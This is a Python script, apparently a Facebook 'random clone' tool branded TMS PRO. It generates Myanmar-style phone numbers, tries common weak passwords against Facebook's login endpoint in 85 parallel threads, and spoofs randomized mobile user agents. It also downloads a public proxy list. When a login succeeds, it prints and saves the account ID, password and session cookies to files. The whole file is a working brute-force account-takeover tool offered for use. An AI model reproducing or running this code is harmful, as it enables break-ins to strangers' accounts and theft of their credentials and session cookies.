import random, requests , re , sys , os , time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ses=requests.Session()
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
ugen=[]
ugen = []
#Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Kyivstar;FBID/phone;FBLC/ru_RU;FBOP/5;FBRV/0]
#Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/452.0.0.39.110;FBBV/569146793;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/571505881]
for xd in range(10000):
    aa='Mozilla/5.0 (iPhone; CPU iPhone OS'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=' like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/'
    h=random.randrange(109, 379)
    i='0'
    j=random.randrange(4200, 4900)
    k=random.randrange(20, 100)
    l='FBBV/569146793;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/571505881'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k}{l}')
    ugen.append(uaku2)
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

def main():
    os.system('clear')
    print(logo)
    print("\033[38;5;43m\033[1;32m[\033[1;97m1\033[1;32m] \033[1;97mSTART UID CLONE")
    print("\033[38;5;43m\033[1;32m[\033[1;97m0\033[1;32m] \033[1;91mEXIT TOOL ")
    ZWE = input(f'\033[1;32m[\033[1;97m?\033[1;32m] \033[1;97mSELECT \033[~~~~~~~\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m]\033[1;97m EXAMPLE \033[38;5;41m ━━ \033[1;32m[\033[1;97m777\033[1;32m] / [\033[1;97m444\033[1;32m] / [\033[1;97m666\033[1;32m] / [\033[1;97m999\033[1;32m]")
    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    code = input('\033[1;32m[\033[1;97m?\033[1;32m]\033[1;97m INPUT YOUR CODE \033[38;5;41m~\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[38;5;43m\033[1;32m[\033[1;97m✔\033[1;32m] \033[1;97mEXAMPLE \033[38;5;41m ~ \033[1;32m[\033[1;97m3000\033[1;32m] / [\033[1;97m5000\033[1;32m] / [\033[1;97m10000\033[1;32m] / [\033[1;97metc..\033[1;32m] ")
    print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    limit=int(input("\033[1;32m[\033[1;32m?\033[1;32m]\033[1;97m INPUT YOUR LIMIT \033[38;5;41m ~ \033[1;32m "))    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=85) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m\033[38;5;43m[\033[1;91m•\033[1;32m]\033[1;97m TOTAL ID        \033[38;5;41m ~    \033[1;32m'+tl+'                  \033[38;5;43m')
        print(f'\033[1;32m\033[38;5;43m[\033[1;91m•\033[1;32m]\033[1;97m CHOICE CODE     \033[38;5;41m ~    \033[1;32m'+code+'                    \033[38;5;43m')
        print(f"\033[1;32m\033[38;5;43m[\033[1;91m•\033[1;32m] \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!          \033[38;5;43m")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love,code+love[:4],love[1:],'myanmar','myanmar123','Myanmar123','Myanmar','kyawkyaw','zawzaw','aungaung','ayeaye','chitchit']
            LEE.submit(rcrack,uid,pwx,tl)

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\033[1;91m[\033[1;97mTMS\033[1;91m]--[\033[1;97m%s\033[1;91m]--[\033[1;97mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1.5',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/?_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Microsoft Edge";v="120.0.2210.91"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '677',}
            lo = session.post('https://www.facebook.com/login/',headers=headers, data=data).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32;40mOK {uid} | {ps}" '  \n\033[1;97m[COOKIE] ━━ \033[1;97m'+coki+  '')
                print(" ")
                print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                open('/sdcard/TMS1-OK.txt', 'a').write( uid+' | '+ps+'\nCookie = '+coki+'\n\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[96:111]
                print(f"\033[1;35;40mCP {uid} | {ps}")
                open('/sdcard/TMS1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

logo = ("""
\033[97m          ████████╗███╗   ███╗███████╗
\033[97m          ╚══██╔══╝████╗ ████║██╔════╝
\033[97m             ██║   ██╔████╔██║███████╗
\033[97m             ██║   ██║╚██╔╝██║╚════██║
\033[97m             ██║   ██║ ╚═╝ ██║███████║
\033[34m             ╚═╝   ╚═╝     ╚═╝╚══════╝     \x1b[38;5;45mPRO
                            
\033[1;33;40m🤎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🤎
\033[1;33;40m<|> \033[1;32mDEVELOPER    \033[38;5;41m~~~ \033[1;32mTHEIN HTET ZAW
\033[1;33;40m<|> \033[1;32mTOOL STATUS  \033[38;5;41m~~~ \033[1;32mRANDOM CLONE
\033[1;33;40m<|> \033[1;32mTOOL VERSION \033[38;5;41m~~~ \033[1;32m00.04
\033[1;33;40m🤎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🤎""")
def linex():
	print(f'\033[1;32m🤎━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🤎')

main()
